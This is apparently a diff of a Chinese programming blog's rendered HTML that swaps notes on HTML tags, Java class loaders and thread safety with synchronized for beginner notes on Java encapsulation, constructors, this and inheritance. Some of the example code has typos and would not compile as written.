+<p>针对<code>private</code>修饰的成员变量，如果需要被其他类使用，提供相应的操作</p>
+<ul>
+<li>提供“<code>get变量名()</code>”方法，用于获取成员变量的值，方法用<code>public</code>修饰</li>
+<li>提供“<code>set变量名(参数)</code>”方法，用于设置成员变量的值，方法用<code>public</code>修饰</li>
+</ul>
+<h2 id="二、this关键字"><a href="#二、this关键字" class="headerlink" title="二、this关键字"></a>二、this关键字</h2><ol>
+<li><p>this修饰的变量用于指代成员变量<br>方法的形参如果与成员变量同名，不带this修饰的变量指的是形参，而不是成员变量<br>方法的形参没有与成员变量同名，不带this修饰的变量指的是成员变量</p>
 </li>
-<li><p><code>&lt;h1&gt;</code>～<code>&lt;h6&gt;</code>：标题标签，表示文本的标题，从大到小分别对应不同级别的标题</p>
+<li><p>什么时候使用this呢? <strong>解决局部变量隐藏成员变量</strong></p>
 </li>
-<li><p><code>&lt;p&gt;</code>：段落标签，用于分隔文本内容</p>
-</li>
-<li><p><code>&lt;a&gt;</code>：超链接标签，用于添加链接到其他文档、页面、图片等</p>
-</li>
-<li><p><code>&lt;img&gt;</code>：图片标签，用于在网页中嵌入图片</p>
-</li>
-<li><p><code>&lt;ul&gt;</code>：无序列表标签，用于创建无序列表</p>
-</li>
-<li><p><code>&lt;ol&gt;</code>：有序列表标签，用于创建有序列表</p>
-</li>
-<li><p><code>&lt;li&gt;</code>：列表项标签，用于创建列表项</p>
-</li>
-<li><p><code>&lt;table&gt;</code>：表格标签，用于创建表格</p>
-</li>
-<li><p><code>&lt;tr&gt;</code>：表格的行标签，表示一行</p>
-</li>
-<li><p><code>&lt;td&gt;</code>：单元格标签，用于表示表格中的单元格</p>
-</li>
-<li><p><code>&lt;form&gt;</code>：表单标签，用于创建表单</p>
-</li>
-<li><p><code>&lt;input&gt;</code>：输入框标签，用于输入文本、表单等</p>
-</li>
-<li><p><code>&lt;select&gt;</code>：下拉列表标签，用于创建下拉选择框</p>
-</li>
-<li><p><code>&lt;textarea&gt;</code>：文本域标签，允许用户输入多行文本</p>
+<li><p>this 代表所在类的对象引用<br>记住:方法被哪个对象调用，this就代表哪个对象</p>
 </li>
 </ol>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--文档声明，声明当前网页的版本--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--html的根标签（元素），网页中的所有内容都要写在根元素的里边--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--head是网页头部，head中的内容不会在网页中直接出现，主要用来帮助浏览器或搜索引擎来解析网页--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--meta标签用来设置网页的元数据，这里meta用来设置网页的字符集，避免乱码问题--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--UTF-8（万国码）--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>显示在浏览器的标题栏<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--body是html的子元素，表示网页的主体，网页中的所有可见的内容都应写在body里面--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      这里是主体</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="格式化标签"><a href="#格式化标签" class="headerlink" title="格式化标签"></a>格式化标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;br/&gt;         换行</span><br><span class="line"></span><br><span class="line">&lt;center&gt; &lt;/center&gt; 居中</span><br><span class="line"></span><br><span class="line">&lt;span&gt;&lt;/span&gt; 行标签(没有换行) </span><br><span class="line">&lt;kbd&gt;&lt;/kbd&gt;   定义键盘码    </span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;/p&gt;       行标签(自带换行)</span><br><span class="line">&lt;pre&gt;&lt;/pre&gt;   块标签不解析内容</span><br><span class="line"></span><br><span class="line">&lt;code&gt;&lt;/code&gt; 行标签不解析内容   </span><br><span class="line">&lt;var&gt;&lt;/var&gt;   定义变量</span><br><span class="line">&lt;em&gt;帅&lt;/em&gt;</span><br><span class="line">&lt;strong&gt;帅&lt;/strong&gt;</span><br><span class="line">em和strong标签都表示强调，但是它们还是有一定的差别的</span><br><span class="line">第一em标签的样式是斜体，而strong标签的样式是加粗</span><br><span class="line">第二em标签是强调语义的，而strong标签是强调内容的</span><br><span class="line">em标签和strong标签都是行内元素。</span><br></pre></td></tr></table></figure>
-<h3 id="样式标签"><a href="#样式标签" class="headerlink" title="样式标签"></a>样式标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;b&gt;加粗&lt;/b&gt;</span><br><span class="line">&lt;i&gt;倾斜&lt;/i&gt;</span><br><span class="line">&lt;s&gt;删除线&lt;/s&gt; 或 &lt;del&gt;19999&lt;/del&gt;</span><br><span class="line">&lt;u&gt;下划线&lt;/u&gt;</span><br><span class="line">&lt;font size=2&gt;字体大小&lt;/font&gt;</span><br><span class="line">&lt;font color=&quot;#fa8072&quot;&gt;字体颜色&lt;/font&gt;  </span><br><span class="line">&lt;hr&gt; 水平线 </span><br><span class="line">&lt;blockquote&gt;孔子说的不对&lt;/blockquote&gt;</span><br><span class="line">&lt;q&gt;老子才不对&lt;/q&gt;&lt;br&gt;</span><br><span class="line">q标签和blockquote标签都是引用，不同的是q标签是短引，用而blockquote标签是长引用会换行的。</span><br></pre></td></tr></table></figure>
-<h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;      &amp;lt; </span><br><span class="line">&gt;      &amp;gt; </span><br><span class="line">空格   &amp;nbsp; </span><br><span class="line">©     &amp;copy; </span><br><span class="line">®     &amp;reg; </span><br><span class="line">™     &amp;trade;</span><br></pre></td></tr></table></figure>
-
-<h3 id="列表标签和表格标签"><a href="#列表标签和表格标签" class="headerlink" title="列表标签和表格标签"></a>列表标签和表格标签</h3><p>列表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无序列表</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;a&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;b&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有序列表</span><br><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li&gt;a&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;b&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自定义列表 没有圆点和需要</span><br><span class="line">&lt;dl&gt;</span><br><span class="line">    &lt;dt&gt;标题&lt;/dt&gt;</span><br><span class="line">    &lt;dd&gt;内容&lt;/dd&gt;</span><br><span class="line">    &lt;dd&gt;内容&lt;/dd&gt;..</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure>
-
-<p>表格</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">cellspacing属性是单元格之间的空隙</span><br><span class="line">cellpadding属性是控制整个单元格的大小</span><br><span class="line">border  是边框粗细</span><br><span class="line">align=&quot;center&quot; 居中   left左  right右</span><br><span class="line">style=&quot;text-align: center&quot; 字体居中</span><br><span class="line">其他的就需要使用css来控制了</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;table   cellspacing=&quot;0&quot; style=&quot;text-align: center&quot;  border=&quot;1px&quot;   &gt;</span><br><span class="line">    &lt;tr &gt;</span><br><span class="line">        &lt;th&gt;标题&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;标题2&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;1&lt;/td&gt;</span><br><span class="line">        &lt;td &gt;1&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td &gt;1&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;1&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="常用的布局标签"><a href="#常用的布局标签" class="headerlink" title="常用的布局标签"></a>常用的布局标签</h3><p>header   网页的头部</p>
-<p>main     网页的主体部分（一般只有一个）</p>
-<p>footer   网页的底部</p>
-<p>nav      网页的导航</p>
-<p>aside    和主题相关的内容</p>
-<p>article  文章之类的</p>
-<p>section  独立的块区，上面的标签都不合适，就用这个</p>
-<p>div      块元素</p>
-<h3 id="常用的图片标签"><a href="#常用的图片标签" class="headerlink" title="常用的图片标签"></a>常用的图片标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;图片地址&quot; alt=&quot;图片不显示时候的提示语句&quot; title=&quot;鼠标悬停提示文字&quot; </span><br><span class="line">width=&quot;图片宽px&quot; height=&quot;图片高px&quot;/&gt;</span><br><span class="line">如果宽高不写就默认原图片大小</span><br><span class="line"></span><br><span class="line">img 的其他属性:   </span><br><span class="line"></span><br><span class="line">hspace 和 vspace 属性可以设置图像周围的空间。   类似于设置外边距效果</span><br><span class="line">hspace:左边和右边的文字与图像之间的间距  单位像素(px)</span><br><span class="line">vspace:上面的下面的文字与图像之间的距离  单位像素(px)</span><br><span class="line"></span><br><span class="line">align 属性定义了图像相对于周围元素的水平和垂直对齐方式。</span><br><span class="line">align的值:left(左)、right(右)、top(上) 、middle(中) 和 bottom(下)。</span><br><span class="line">left 和 right 值会把图像周围与其相连的文本转移到相应的边界中；</span><br><span class="line">其余的三个值将图像与其相邻的文字在垂直方向上对齐</span><br></pre></td></tr></table></figure>
-
-<h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controls提供播放暂停音量控制  必须有</span><br><span class="line">autoplay 自动播放。 (一般不要设置 会增加页面的加载速度) 有的游览器会拦截</span><br><span class="line">preload  视频在页面加载时进行加载，并预备播放。</span><br><span class="line">	如果使用 &quot;autoplay&quot;，则忽略属性。属性值</span><br><span class="line">	auto - 当页面加载后载入整个音频</span><br><span class="line">	meta - 当页面加载后只载入元数据</span><br><span class="line">	none - 当页面加载后不载入音频</span><br><span class="line">    </span><br><span class="line">(一般不要设置 会增加页面的加载速度)</span><br><span class="line"></span><br><span class="line">loop   媒介文件完成播放后再次开始播放     重复播放</span><br><span class="line">width=”宽度”  height=”高度”</span><br><span class="line">muted   视频的音频应该被静音</span><br><span class="line"></span><br><span class="line">&lt;video width=&quot;320&quot; height=&quot;240&quot; controls &gt;</span><br><span class="line">    &lt;source src=&quot;img/1.mp4&quot; type=&quot;video/mp4&quot;&gt;</span><br><span class="line">    您的浏览器不支持 video 属性。</span><br><span class="line">&lt;/video&gt;</span><br><span class="line"></span><br><span class="line">游览器的不同 显示的 视频 播放按钮的样式也是不同的</span><br><span class="line">source支持写多个    游览器 从上到下 识别最适合他的  视频类型</span><br></pre></td></tr></table></figure>
-
-<h3 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controls   向用户显示控件，比如播放按钮。</span><br><span class="line">autoplay   自动播放。 (一般不要设置 会增加页面的加载速度) 有的游览器会拦截</span><br><span class="line">loop     每当音频结束时重新开始播放   </span><br><span class="line">preload  音频在页面加载时进行加载，并预备播放。如果使用 &quot;autoplay&quot;，则忽略该属性。  属性值</span><br><span class="line">	auto - 当页面加载后载入整个音频</span><br><span class="line">	meta - 当页面加载后只载入元数据</span><br><span class="line">	none - 当页面加载后不载入音频</span><br><span class="line">	(一般不要设置 会增加页面的加载速度)</span><br><span class="line"></span><br><span class="line">&lt;audio controls  autoplay loop&gt;</span><br><span class="line">    &lt;source src=&quot;img/无羁.mp3&quot; type=&quot;audio/mp3&quot; &gt;</span><br><span class="line">    游览器不支持此播放器</span><br><span class="line">&lt;/audio&gt;</span><br><span class="line"></span><br><span class="line">游览器的不同 显示的 视频 播放按钮的样式也是不同的</span><br><span class="line">source支持写多个    游览器 从上到下 识别最适合他的  音频类型</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>语言</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java安全</title>
-    <url>/2023/08/15/Java%E5%AE%89%E5%85%A8/</url>
-    <content><![CDATA[<h1 id="Java安全"><a href="#Java安全" class="headerlink" title="Java安全"></a>Java安全</h1><span id="more"></span>
-
-<p>java通过以下技术来实现安全机制</p>
-<ul>
-<li>语言设计特性(对数组边界检查，只进行合法的类型转换，无指针算法)</li>
-<li>访问控制机制，用于控制代码能够执行的功能</li>
-<li>代码签名，java代码的作者能够用加密算法来表明java代码的作者</li>
-</ul>
-<p>一.类加载器</p>
-<p><a href="https://so.csdn.net/so/search?q=%E8%99%9A%E6%8B%9F%E6%9C%BA&spm=1001.2101.3001.7020">虚拟机</a>只加载程序需要的类文件，例如程序从MyProgram.Class执行，下面是虚拟机执行步骤：</p>
-<ol>
-<li>虚拟机有一个用于加载类文件的机制，例如从磁盘文件加载或web请求访问，使用该价值加载MyProgram.Class</li>
-<li>如果MyProgram.Class拥有一个类型为另一个类的实例变量，或者拥有超类，那么这些类文件也被加载</li>
-<li>接着虚拟机执行MyProgram.Class的main方法，因为它是静态，无需实例化</li>
-<li>如果main方法或者调用其他方法使用到得类，这些类被加载</li>
+<h2 id="三、封装"><a href="#三、封装" class="headerlink" title="三、封装"></a>三、封装</h2><ol>
+<li><strong>封装概述</strong><br>是面向对象三大特征之一 (封装，继承，多态)<br>是面向对象编程语言对客观世界的横拟，客观世界里成员变量都是隐藏在对象内部的，外界是无法直接操作</li>
+<li><strong>封装规则</strong><br>将类的某些信息隐藏在类内部，不允许外部程序直接访问，而是通过该类提供的方法来实现对的冠信息的操作和访问成员变量private，提供对应的getXxx()&#x2F;setXxx()方法</li>
+<li><strong>好处</strong><br>通过方法来控制成员变量的操作，提高了代码的安全性<br>把代码用方法进行封装，提高了代码的复用性</li>
 </ol>
-<p>  类加载机制至少拥有三个类加载器：</p>
+<h2 id="四、构造方法"><a href="#四、构造方法" class="headerlink" title="四、构造方法"></a>四、构造方法</h2><p>在创建一个对象的时候，至少要调用一个构造方法。构造方法的名称必须与类同名，一个类可以有多个构造方法。</p>
+<p>下面是一个构造方法示例：</p>
+<p>public class Student{   </p>
+<p>​		 public Student(){ }     </p>
+<p>​		 public Student(String name){         </p>
+<p>​			&#x2F;&#x2F; 这个构造器仅有一个参数：name    } }</p>
+<p><strong>注意事项</strong>：</p>
+<ol>
+<li><p>构造方法的创建</p>
+<p>如果没有定义构造方法，系统将给出一个认的无参数构造方法<br>如果定义了构造方法，系统将不再提供默认的构造方法</p>
+</li>
+<li><p>构造方法的重载<br>如果自定义了带参构造方法，还要使用无参数构造方法，就必须再写一个无参数构造方法</p>
+</li>
+<li><p>推荐的使用方式<br>无论是否使用，都手工书写无参数构造方法</p>
+</li>
+</ol>
+<h5 id="标准类制作"><a href="#标准类制作" class="headerlink" title="标准类制作"></a>标准类制作</h5><ol>
+<li>成员变量<br>使用private修饰</li>
+<li>构造方法<br>提供一个无参构造方法<br>提供一个带多个参数的构造方法</li>
+<li>成员方法<br>提供每一个成员变量对应的setXxx()&#x2F;getXxx()<br>提供一个显示对象信息的show()</li>
+<li>创建对象并为其成员变量值的两种方式<br>无参构造方法创建对象后使用setXxx()赋值<br>使用带参构造方法直接创建带有属性值的对象</li>
+</ol>
+<p>例子：</p>
+<h5 id="Student-java程序"><a href="#Student-java程序" class="headerlink" title="Student.java程序"></a>Student.java程序</h5><p>public class Student{   </p>
+<p>​		prative String name;&#x2F;&#x2F;成员变量</p>
+<p>​		prative int age;</p>
+<p>​		public Student() { }&#x2F;&#x2F;构造方法</p>
+<p>​		public Student(String name,int age){ </p>
+<p>​			this.name &#x3D; name;</p>
+<p>​			this.age &#x3D; age;}</p>
+<p>​		&#x2F;&#x2F;成员方法</p>
+<p>​		public void setName(String name){</p>
+<p>​			this.name &#x3D; name;}</p>
+<p>​		public String getName(){</p>
+<p>​			return name;}</p>
+<p>​		public void setAge(int age){</p>
+<p>​			this.age &#x3D; age;}</p>
+<p>​		public String getAge(){</p>
+<p>​			return age;}</p>
+<p>​		public void show(){</p>
+<p>​			System.out.println(name+”,”+age);}</p>
+<p>} </p>
+<h5 id="StudentDemo-java程序"><a href="#StudentDemo-java程序" class="headerlink" title="StudentDemo.java程序"></a>StudentDemo.java程序</h5><p>package com.XXX</p>
+<p>public class StudentDemo{</p>
+<p>​		public static void main(String[ ] args){</p>
+<p>​			&#x2F;&#x2F;无参构造方法创建对象后使用setXxx()赋值</p>
+<p>​			Student s1 &#x3D; new Student( );</p>
+<p>​			s1.setName(“xuan”);</p>
+<p>​			s1.setAge(18);</p>
+<p>​			s1.show();</p>
+<p>​			&#x2F;&#x2F;使用带参构造方法直接创建带有属性值的对象</p>
+<p>​			Student s2 &#x3D; new Student(“name:”xuan”,age:18);</p>
+<p>​			s2.show();</p>
+<p>​		}		</p>
+<p>}</p>
+<p><strong>运行结果</strong>：</p>
+<p>xuan,18</p>
+<p>xuan,18</p>
+<h1 id="Java-继承"><a href="#Java-继承" class="headerlink" title="Java 继承"></a>Java 继承</h1><hr>
+<h2 id="继承的概念"><a href="#继承的概念" class="headerlink" title="继承的概念"></a>继承的概念</h2><p>继承是面向对象的三大特征之一，可以使得子类具有父类的属性和方法，还可以在子类中重新定义，追加属性和方法</p>
 <ul>
-<li>引导类加载器 负责加载系统类，从JAR文件rt.jar中加载，它是虚拟机整体一部分。而且它是C语言实现的，另外引导类加载器没有ClassLoader对象</li>
-<li>扩展类加载器 用于从jre&#x2F;lib&#x2F;ext目录加载“标准的扩展”，</li>
-<li>系统类加载器(也陈为应用类加载器) 加载应用类，它是在CLASSPATH环境变量或者是-classpath命令行选项设置的类目录里或者是JAR&#x2F;ZIP文件里查找这些类。</li>
+<li>格式:public class 子类名extends父类名}</li>
+<li>范例: public class Zi extends Fu<br>Fu:是类，也被称为基类、超类<br>Zi: 是子类，也被称为派生类</li>
 </ul>
-<h1 id="Java线程安全"><a href="#Java线程安全" class="headerlink" title="Java线程安全"></a>Java线程安全</h1><p>一、什么是线程安全</p>
-<p>想给出一个线程安全的确切定义是复杂的，但我们可以这样认为：<br>如果多线程环境下代码运行的结果是符合我们预期的，即在单线程环境应该的结果，则说这个程序是线程安全的</p>
-<p>🌰栗子</p>
-<pre><code>package Thread;
- 
-public class demo77 &#123;
-    private static int count;
-    public static void main(String[] args) throws InterruptedException &#123;
-        Thread t1 = new Thread(() -&gt; &#123;
-            for (int i = 0; i &lt; 5000; i++) &#123;
-                count++;
-            &#125;
-        &#125;);
-        Thread t2 = new Thread(() -&gt; &#123;
-            for (int i = 0; i &lt; 5000; i++) &#123;
-                count++;
-            &#125;
-        &#125;);
-        t1.start(); // 两个线程在创建好了后，线程所对应的PCB加入到系统链表，参与系统调度
-        t2.start();
-        // 让主线程main等t1、t2执行完了再接着往下走
-        t1.join();
-        t2.join();
-        System.out.println(count);
-    &#125;
-&#125;
-</code></pre>
-<p> 想这样，在多线程情况下，程序的运行结果不符合我们的预期，这被称为线程不安全</p>
-<p>二、造成线程不安全的原因 </p>
-<p>根本原因：操作系统的随机调度执行，抢占式执行 </p>
-<pre><code>还有：我们可以看到我们的count是一个全局变量，我们的线程t1、线程t2对count变量同时都进行了修改——++操作（为什么说是同时呢，因为我们的t1线程、t2线程在创建完了后就参与到系统调度，由系统随机分配线程的执行，可能是t2线程先执行10个指令然后t1再执行10个指令，相当于是同时）
-</code></pre>
-<p>那么我们就改一下代码让t1、t2分批次对count修改不就行了吗？</p>
-<pre><code>package Thread;
- 
-public class demo77 &#123;
-    private static int count;
-    public static void main(String[] args) throws InterruptedException &#123;
-        Thread t1 = new Thread(() -&gt; &#123;
-            for (int i = 0; i &lt; 5000; i++) &#123;
-                count++;
-            &#125;
- 
-        &#125;);
-        Thread t2 = new Thread(() -&gt; &#123;
-            try &#123;
-                t1.join();// 等t1线程执行完了，t2线程再执行
-            &#125; catch (InterruptedException e) &#123;
-                e.printStackTrace();
-            &#125;
-            for (int i = 0; i &lt; 5000; i++) &#123;
-                count++;
-            &#125;
-        &#125;);
-        t1.start(); // 两个线程在创建好了后，线程所对应的PCB加入到系统链表，参与系统调度
-        t2.start();
- 
-        t2.join(); // 等t2线程执行完了，主线程main再接着执行，执行顺序：t1-&gt;t2-&gt;打印count
-        System.out.println(count);
-    &#125;
-&#125;
-</code></pre>
-<p>大家有没有想过为什么多个线程同时执行count++的时候就会出现BUG呢？</p>
-<p>这是因为我们多个线程同时对同一变量修改的所造成的BUG往往和我们操作的原子性有关！！！这时候的操作往往不是一个整体，多个线程并发执行这些操作就可能出现一些问题</p>
-<p>如果我们在变量修改过程中，操作是原子的——只是对应一个机器指令，那么即使是多个线程同时对同一个变量修改也不一定会造成BUG,但也可能造成BUG——要看具体的业务场景</p>
-<p>总之我们要避免多个线程同时对同一个变量来操作</p>
-<p>🍑 对原子性在多线程并发执行中出现问题的分析</p>
-<p>🔔🔔注意：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">像 count++ 其实一行代码, 对应三个机器指令!</span><br><span class="line">1)从内存读取数据到 CPU load</span><br><span class="line">2)在 CPU 寄存器中,完成加法运算 add</span><br><span class="line">3)把寄存器的数据写回到内存中 save</span><br><span class="line">这几个步骤单线程下执行,没有任何问题</span><br><span class="line">如果是多线程并发执行,这个就不一定了!!</span><br></pre></td></tr></table></figure>
-
-<p>当我们执行t1.start()、t2.start()后，t1线程和t2线程就在操作系统内核中创建出来了，t1、t2线程就参与到了系统调度当中</p>
-<p>而调度是随机的——他可能先让t1执行几个指令，然后t2再执行几个指令、最后再把CPU的控制权交给t1。</p>
-<p>于是因为系统的调度是随机的（这是罪魁祸首，但我们无法改变），当我们多个线程同时执行一些不是整体的操作的时候（++或–）由于并发就会产生一些问题</p>
-<p> <strong>🌰栗子一</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/15ac811137144c5abc01c49068c5a363.png" alt="img"></p>
-<p><strong>🌰栗子二</strong> </p>
-<p><img src="https://img-blog.csdnimg.cn/2cb8f0784e024604a6c09d38882f0676.png" alt="img"></p>
-<p>为什么会产生上面的BUG呢？</p>
-<p>就是因为我们的++操作不是一个整体，是一个由多个指令所组成的操作 </p>
-<p>解决方案：也是加锁：“synchronized”,意味着把这三条指令打包成了一组指令，然后把这一组指令看出成一条指令了，类似于数学里的“整体代换”思想。</p>
-<p> <img src="https://img-blog.csdnimg.cn/82dc94c8208f479e86508569793a36be.png" alt="img"></p>
-<p> 首先我们要明白加锁操作都是针对某一个对象来进行的（加锁本质就是给对象头里设置个标记），加锁有以下几种形式</p>
-<p>形式一、 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class demo7777 &#123;</span><br><span class="line">	public static Object object1 = new Object();</span><br><span class="line">	public static Object object2 = new Object();</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		Thread t1 = new Thread(() -&gt;&#123;</span><br><span class="line">			synchronized (object1)&#123;//对object1对象进行了加锁操作</span><br><span class="line">				System.out.println(&quot;t1线程start&quot;);</span><br><span class="line">				try &#123;</span><br><span class="line">						Thread.sleep( millis: 1000);</span><br><span class="line">				&#125; catch (InterruptedException e)&#123;</span><br><span class="line">					e.printStackTrace();</span><br><span class="line">				&#125;</span><br><span class="line">				System.out.println(&quot;t1线程finish&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">t1.start();</span><br></pre></td></tr></table></figure>
-
-<p> 形式二、</p>
-<pre><code>package Thread;
- 
-class Counter &#123;
-    public static int count;
-//    public synchronized void increase() &#123;
-//        ++count; 这两种写法视为是等价的
-//    &#125;
-    public void increase() &#123;
-        synchronized (this) &#123; // 这里this可以是任意对象，this可以有多个Counter counter1 = new Counter(), Counter counter2 = new Counter();
-            ++count;
-        &#125;
-    &#125;
-&#125;
-public class demo777 &#123;
- 
-    public static void main(String[] args) throws InterruptedException &#123;
-        Counter counter1 = new Counter();
-        Counter counter2 = new Counter();
-        Thread t1 = new Thread(() -&gt; &#123;
-            for (int i = 0; i &lt; 5000; i++) &#123;
-                counter1.increase();
-            &#125;
-        &#125;);
-        Thread t2 = new Thread(() -&gt; &#123;
-            for (int i = 0; i &lt; 5000; i++) &#123;
-                counter1.increase();
-            &#125;
-            // 多个线程去调用这个increase方法，其实就是针对这个Counter对象counter1来进行加锁
-            // 如果一个线程t1获取到了该对象counter1的锁，那么另一个线程t2就要等到counter1对应的锁开了后（t1线程执行完该锁里的内容——++操作）t2才能执行++操作
-            // 此时++操作相当于是成为了一个整体（相当于一个指令，当一个线程再执行这个加锁的整体的指令的时候，另一个线程只能阻塞等待）
-        &#125;);
-        t1.start();
-        t2.start();
-        t1.join();
-        t2.join(); // 确保线程t1和线程t2都执行完了，main主线程再接着执行——输出count
-        System.out.println(Counter.count); // 输出10000
-    &#125;
-&#125;
-</code></pre>
-<p>形式三、 </p>
-<p> 加锁本质 就是给对象头里设置个标记,它的成员对应的对象的对象头不受影响</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public synchronized static void func1() &#123;</span><br><span class="line">&#125;</span><br><span class="line">public static void func2() &#123;</span><br><span class="line">	synchronized(Counter.class)&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>使用类对象加锁,和类里有啥成员没关系~~<br>synchronized static、Counter.class这俩写法视为是等价的!!<br>类对象是整个程序里唯一的!!<br>这样加锁,但凡是调用到 func1 和 func2，之间都会产生竞争!!</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Counter1 &#123;</span><br><span class="line">	public static int count;</span><br><span class="line">	public synchronized static void increase() &#123;</span><br><span class="line">		++count;</span><br><span class="line">	&#125;</span><br><span class="line">public class demo77777 </span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		Counter1 counter1 = new Counter1();</span><br><span class="line">		Thread t1 = new Thread(() -&gt;&#123;</span><br><span class="line">			for (int i = 日; i &lt; 500; i++) &#123;</span><br><span class="line">				System.out.println(&quot;t1 start&quot;);</span><br><span class="line">				Counter1.increase();</span><br><span class="line">				System.out.printin(&quot;t1 finish&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">		t1.start();</span><br></pre></td></tr></table></figure>
-
-<p>当我们给不同的对象上锁后，如果用住房来比喻</p>
-<pre><code>不同的房间相当于是不同的对象，不同的线程相当于是不同的客人
-
-如果房间1住了客人A，那么房间1就上了锁，客人B就需要等客人A不再住房间1（开了锁）然后客人B才能住房间1；或者客人B住其他的房间（其他的对象，没上锁的）
-
-package Thread;
-// 测试线程竞争，对锁的竞争
-public class demo7777 &#123;
-    public static Object object1 = new Object();
-    public static Object object2 = new Object();
-    public static void main(String[] args) &#123;
-        Thread t1 = new Thread(() -&gt; &#123;
-            // 针对object1对象进行加锁，加锁操作是针对某一个对象来进行的
-            synchronized (object1) &#123;
-                System.out.println(&quot;t1线程start&quot;);
-                try &#123;
-                    Thread.sleep(1000);
-                &#125; catch (InterruptedException e) &#123;
-                    e.printStackTrace();
-                &#125;
-                System.out.println(&quot;t1线程finish&quot;);
-            &#125;
-        &#125;);
-        t1.start();
-        Thread t2 = new Thread(() -&gt; &#123;
-            synchronized (object1) &#123;  // 针对object1对象来进行加锁操作
-                System.out.println(&quot;t2线程start&quot;);
-                try &#123;
-                    Thread.sleep(1000);
-                &#125; catch (InterruptedException e) &#123;
-                    e.printStackTrace();
-                &#125;
-                System.out.println(&quot;t2线程finish&quot;);
-            &#125;
-        &#125;);
-        t2.start();
-    &#125;
-&#125;
-</code></pre>
-<p>无论是使用哪种用法,使用 synchronized 的时候都是要明确锁对象!(明确是对哪个对象加锁)</p>
-<p>只有当两个线程针对同一个对象加锁的时候,才会发生竞争</p>
-<p>如果是两个线程针对不同对象加锁,则没有竞争~</p>
-<p>我们上面就是两个线程t1和t2同时对object1这个对象进行了加锁，然后t1与t2直接就产生了竞争。从上述代码的实现过程中我们也可以看到，等到t1线程执行完了后，t2线程才开始执行。</p>
-<p>但如果是两个线程对不同的对象进行加锁，则没有竞争（就像两个客人（两个线程）住不同的房间（不同的对象）当然不会发生竞争。</p>
-<pre><code>package Thread;
-// 测试线程竞争，对锁的竞争
-public class demo7777 &#123;
-    public static Object object1 = new Object();
-    public static Object object2 = new Object();
-    public static void main(String[] args) &#123;
-        Thread t1 = new Thread(() -&gt; &#123;
-            synchronized (object1) &#123; // 针对object1对象来进行加锁，加锁操作是针对一个对象来进行的
-                System.out.println(&quot;t1线程start&quot;);
-                try &#123;
-                    Thread.sleep(1000);
-                &#125; catch (InterruptedException e) &#123;
-                    e.printStackTrace();
